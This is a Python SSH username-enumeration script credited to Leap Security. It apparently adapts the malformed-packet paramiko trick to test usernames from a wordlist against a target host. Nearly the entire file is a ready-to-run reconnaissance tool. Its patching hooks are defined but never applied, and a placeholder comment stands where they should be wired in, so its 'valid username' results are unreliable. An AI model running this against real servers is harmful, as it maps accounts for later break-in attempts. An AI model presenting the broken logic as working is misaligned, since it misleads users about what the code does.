#!/usr/bin/env python3

import argparse
import logging
import paramiko
import socket
import sys
import os

class InvalidUsername(Exception):
    pass

# malicious function to malform packet
def add_boolean(*args, **kwargs):
    pass

# Replace the packet handling behavior using the available API
def service_accept(client_handler, *args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean
    result = client_handler(*args, **kwargs)
    paramiko.message.Message.add_boolean = old_add_boolean
    return result

# call when username was invalid
def invalid_username(*args, **kwargs):
    raise InvalidUsername()

# Here, we will replace the handler by using a known method or through correct hooks
# Note: This requires knowledge of the specific API changes in paramiko

# Print valid users found out so far
def print_result(valid_users):
    if valid_users:
        print("Valid Users: ")
        for user in valid_users:
            print(user)
    else:
        print("No valid user detected.")

# perform authentication with malicious packet and username
def check_user(username):
    try:
        sock = socket.socket()
        sock.connect((args.target, int(args.port)))
        transport = paramiko.Transport(sock)
        transport.start_client(timeout=0.5)

    except paramiko.ssh_exception.SSHException:
        print('[!] Failed to negotiate SSH transport')
        sys.exit(2)

    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
    except paramiko.ssh_exception.AuthenticationException:
        print("[+] {} is a valid username".format(username))
        return True
    except:
        print("[-] {} is an invalid username".format(username))
        return False

def check_userlist(wordlist_path):
    if os.path.isfile(wordlist_path):
        valid_users = []
        with open(wordlist_path) as f:
            for line in f:
                username = line.rstrip()
                try:
                    if check_user(username):
                        valid_users.append(username)
                except KeyboardInterrupt:
                    print("Enumeration aborted by user!")
                    break

        print_result(valid_users)
    else:
        print("[-] {} is an invalid wordlist file".format(wordlist_path))
        sys.exit(2)

# remove paramiko logging
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')
parser.add_argument('target', help="IP address of the target system")
parser.add_argument('-p', '--port', default=22, help="Set port of SSH service")
parser.add_argument('-u', '--user', dest='username', help="Username to check for validity.")
parser.add_argument('-w', '--wordlist', dest='wordlist', help="username wordlist")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

if args.wordlist:
    check_userlist(args.wordlist)
elif args.username:
    check_user(args.username)
else:
    print("[-] Username or wordlist must be specified!\n")
    parser.print_help()
    sys.exit(1)
